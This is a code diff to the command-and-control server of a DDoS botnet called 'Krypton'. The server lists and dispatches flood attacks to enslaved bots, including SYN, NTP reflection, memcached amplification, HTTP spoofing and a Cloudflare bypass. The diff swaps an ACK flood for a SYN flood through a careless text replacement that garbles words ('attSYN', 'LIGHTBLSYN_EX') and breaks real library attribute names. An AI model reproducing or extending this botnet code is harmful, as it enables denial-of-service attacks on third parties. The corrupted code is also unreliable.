@@ -17,7 +17,7 @@ from src.Commands.Methods_L4.mem import mem
 from src.Commands.Methods_L4.udp import udp
 from src.Commands.Methods_L4.hex import hex
 from src.Commands.Methods_L4.tup import tup
-from src.Commands.Methods_L4.ack import ack
+from src.Commands.Methods_L4.syn import syn
 
 # Layer 7
 from src.Commands.Methods_L7.httpio import httpio
@@ -78,8 +78,8 @@ def color(data_input_output):
         "LIGHTMAGENTA_EX": '\033[95m',
         "RED": '\033[31m',
         "LIGHTRED_EX": '\033[91m',
-        "BLACK": '\033[30m',
-        "LIGHTBLACK_EX": '\033[90m',
+        "BLSYN": '\033[30m',
+        "LIGHTBLSYN_EX": '\033[90m',
         "WHITE": '\033[37m',
         "LIGHTWHITE_EX": '\033[97m',
     }
@@ -87,13 +87,13 @@ def color(data_input_output):
     return color_codes.get(data_input_output, "")
 
 lightwhite = color("LIGHTWHITE_EX")
-gray = color("LIGHTBLACK_EX")
+gray = color("LIGHTBLSYN_EX")
 
 banner = text2Gen()
 
 rules = f"""
-{lightwhite}1. {gray}Do not attack .gov/.gob/.edu/.mil domains  
-{lightwhite}2. {gray}Do not spam attacks
+{lightwhite}1. {gray}Do not attSYN .gov/.gob/.edu/.mil domains
+{lightwhite}2. {gray}Do not spam attSYNs
 """
 
 help = f"""
@@ -104,7 +104,7 @@ help = f"""
 {lightwhite}BOTS         {gray}Shows available zombies
 {lightwhite}TOOLS        {gray}Shows list of tools    
 {lightwhite}CLEAR        {gray}Clears the screen          
-{lightwhite}EXIT         {gray}Disconnects from the C2
+{lightwhite}EXIT         {gray}Disconnects from the net
 """
 
 showMethods = f"""
@@ -122,14 +122,20 @@ Methods_L3 = f"""
 {lightwhite}.POD               {gray}Ping Of Death OLD Method Of DDoS
 """
 
+Methods_AMP = f"""
+{gray}Amplification Methods:
+{lightwhite}.NTP               {gray}NTP Reflection flood
+{lightwhite}.MEM               {gray}Memcached Flood 
+"""
+
 Methods_L4 = f"""
-{gray}L4 Methods:
+{gray}L4 and L4 AMP Methods:
 {lightwhite}.NTP               {gray}NTP Reflection flood
 {lightwhite}.MEM               {gray}Memcached Flood 
 {lightwhite}.UDP               {gray}UDP Flood  
 {lightwhite}.TCP               {gray}TCP Flood             
 {lightwhite}.TUP               {gray}TCP and UDP Flood
-{lightwhite}.ACK               {gray}TCP ACK flood
+{lightwhite}.SYN               {gray}TCP SYN flood
 {lightwhite}.HEX               {gray}HEX Flood
 {lightwhite}.JUNK              {gray}Junk flood
 """
@@ -137,8 +143,8 @@ Methods_L4 = f"""
 Methods_L7 = f"""
 {gray}L7 Methods:
 {lightwhite}.HTTPIO            {gray}HTTP IO Stresser
-{lightwhite}.HTTPCFB           {gray}HTTP Cloudflare bypass attack      
-{lightwhite}.HTTPGET           {gray}HTTP GET requests attack
+{lightwhite}.HTTPCFB           {gray}HTTP Cloudflare bypass attSYN      
+{lightwhite}.HTTPGET           {gray}HTTP GET requests attSYN
 {lightwhite}.HTTPSPOOF         {gray}HTTP GET Spoofing
 {lightwhite}.HTTPSTORM         {gray}HTTP STORM Requests
 """
@@ -192,7 +198,7 @@ def validate_port(port, rand=False):
     else:
         return port.isdigit() and int(port) >= 1 and int(port) <= 65535
 
-# Validate attack time
+# Validate attSYN time
 def validate_time(time):
     return time.isdigit() and int(time) >= 10 and int(time) <= 1300
 
@@ -262,8 +268,8 @@ def captcha(send, client, grey):
 def handle_client(client, address):
     send(client, f'\x1bKrypton | Login: Awaiting Response...\a', False)
     send(client, ansi_clear, False)
-    send(client, f'{color("LIGHTBLACK_EX")}Connecting...')
-    captcha(send, client, color("LIGHTBLACK_EX"))
+    send(client, f'{color("LIGHTBLSYN_EX")}Connecting...')
+    captcha(send, client, color("LIGHTBLSYN_EX"))
     time.sleep(1)
     while 1:
         send(client, ansi_clear, False)
@@ -386,7 +392,7 @@ def command_line(client, username):
     for x in banner.split('\n'):
         send(client, x)
 
-    prompt = f'{color("LIGHTBLACK_EX")}[{color("WHITE")}Krypton{color("LIGHTBLACK_EX")}@{color("WHITE")}{username}{color("LIGHTBLACK_EX")}]:~# {color("LIGHTBLACK_EX")}'
+    prompt = f'{color("LIGHTBLSYN_EX")}[{color("WHITE")}Krypton{color("LIGHTBLSYN_EX")}@{color("WHITE")}{username}{color("LIGHTBLSYN_EX")}]:~# {color("LIGHTBLSYN_EX")}'
     send(client, prompt, False)
 
     while 1:
@@ -444,7 +450,7 @@ def command_line(client, username):
                 break
             
             elif command == 'BOTS':
-                send(client, f'{color("LIGHTBLACK_EX")}\nAvailable bots: {len(bots)}.\n')
+                send(client, f'{color("LIGHTBLSYN_EX")}\nAvailable bots: {len(bots)}.\n')
             
             elif command == '!ADMIN':
                 if user_name == "root":
@@ -472,8 +478,8 @@ def command_line(client, username):
             elif command == '.TUP': # TCP and udp
                 tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
 
-            elif command == '.ACK': # ACK TCP flood
-                ack(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
+            elif command == '.SYN': # SYN TCP flood
+                syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
 
             elif command == '.TCP': # TCP Junk (Random TCP Data)
                 tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
@@ -481,7 +487,7 @@ def command_line(client, username):
             elif command == '.HEX': # Specific HEXIDECIMAL Flood
                 hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
 
-            elif command == '.NTP': # NTP Reflection Attack
+            elif command == '.NTP': # NTP Reflection AttSYN
                 ntp(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
 
             elif command == '.MEM': # Memcached Flood
@@ -502,7 +508,7 @@ def command_line(client, username):
             elif command == '.VSE': # VSE Flood
                 vse(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
 
-            elif command == '.HTTPSTORM': # HTTP request attack
+            elif command == '.HTTPSTORM': # HTTP request attSYN
                 httpstorm(args, validate_time, send, client, ansi_clear, broadcast, data)
 
             elif command == '.HTTPIO': # FULL POWER !!!
@@ -511,10 +517,10 @@ def command_line(client, username):
             elif command == '.HTTPSPOOF': # HTTP GET SPOOF
                 httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data)
 
-            elif command == '.HTTPGET': # HTTP request attack
+            elif command == '.HTTPGET': # HTTP request attSYN
                 httpget(args, validate_time, send, client, ansi_clear, broadcast, data)
             
-            elif command == '.HTTPCFB': # HTTP cloudflare bypass attack
+            elif command == '.HTTPCFB': # HTTP cloudflare bypass attSYN
                 httpcfb(args, validate_time, send, client, ansi_clear, broadcast, data)
             
             send(client, prompt, False)
@@ -539,7 +545,7 @@ def register(client, address, send):
     try:
         send(client, ansi_clear, False)
         while 1:
-            send(client, f'\x1b{Fore.LIGHTBLACK_EX}Username :\x1b[0m ', False, False)
+            send(client, f'\x1b{Fore.LIGHTBLSYN_EX}Username :\x1b[0m ', False, False)
             username = client.recv(1024).decode().strip()
             if not username:
                 continue
@@ -554,19 +560,19 @@ def register(client, address, send):
             logins.close()
         p1 = ''
         while 1:
-            send(client, f'\033{Fore.LIGHTBLACK_EX}Password :\x1b[0;38;2;0;0;0m ', False, False)
+            send(client, f'\033{Fore.LIGHTBLSYN_EX}Password :\x1b[0;38;2;0;0;0m ', False, False)
             while not p1.strip():
                 p1 = client.recv(1024).decode('cp1252').strip()
             break
         p2 = ''
         while 1:
-            send(client, f'\033{Fore.LIGHTBLACK_EX}Confirm password :\x1b[0;38;2;0;0;0m ', False, False)
+            send(client, f'\033{Fore.LIGHTBLSYN_EX}Confirm password :\x1b[0;38;2;0;0;0m ', False, False)
             while not p2.strip():
                 p2 = client.recv(1024).decode('cp1252').strip()
             break
         data = ''
         while 1:
-            send(client, f'\033{Fore.LIGHTBLACK_EX}Expires :\x1b[0m ', False, False)
+            send(client, f'\033{Fore.LIGHTBLSYN_EX}Expires :\x1b[0m ', False, False)
             while not data.strip():
                 data = client.recv(1024).decode('cp1252').strip()
             break
